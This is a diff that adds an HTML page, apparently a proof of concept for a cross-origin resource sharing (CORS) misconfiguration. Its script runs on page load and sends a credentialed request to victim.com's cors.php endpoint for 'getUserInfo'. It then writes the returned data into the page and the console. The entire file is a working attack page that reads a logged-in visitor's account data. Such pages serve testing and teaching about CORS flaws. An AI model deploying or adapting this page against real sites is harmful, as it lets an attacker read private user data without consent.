@@ -1,0 +1,20 @@
+<!doctype html>
+<html lang="zh-cn">
+<head>
+    <meta charset="UTF-8" />
+    <title></title>
+</head>
+<body>
+<a id="cors"></a>
+</body>
+<script src="https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js"></script>
+<script>
+  var xmlHttp;
+    xmlHttp = new XMLHttpRequest();
+    xmlHttp.withCredentials = true;
+    xmlHttp.open( "GET", 'http://victim.com/cors/cors.php?a=getUserInfo', false );
+    xmlHttp.send( null );
+    console.log(xmlHttp.responseText);
+    document.getElementById('cors').innerHTML=xmlHttp.responseText;
+</script>
+</html>
